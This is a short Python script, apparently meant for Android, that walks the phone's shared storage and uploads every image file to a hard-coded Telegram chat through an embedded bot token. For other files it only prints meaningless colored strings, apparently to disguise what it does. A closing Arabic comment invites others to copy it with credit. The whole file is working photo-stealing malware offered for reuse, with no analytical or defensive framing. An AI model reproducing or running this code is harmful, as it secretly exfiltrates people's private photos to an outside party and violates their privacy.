import os
import telebot
from threading import Thread
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

bot = telebot.TeleBot("8328122291:AAGOLrGTWUuR8Sl4VbekocXK72X8__8_oLM") 

#@M02MM
dir_path = "/storage/emulated/0/"
	
#@uiujq
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
            bot.send_photo(chat_id="7863628255", photo=f) 
        else:
            print(f"{Fore.RED}iwhd")
            print(f"{Fore.GREEN}akshshw")
            print(f"{Fore.YELLOW}jdbdiwow")
            print(f"{Fore.CYAN}jdiowi")

for root, dirs, files in os.walk(dir_path):
    threads = []
    for file in files:
        file_path = os.path.join(root, file)
        t = Thread(target=send_file, args=(file_path,))
        t.start()
        threads.append(t)
    for thread in threads:
        thread.join()
#اخمط بس اذكر مصدر وبس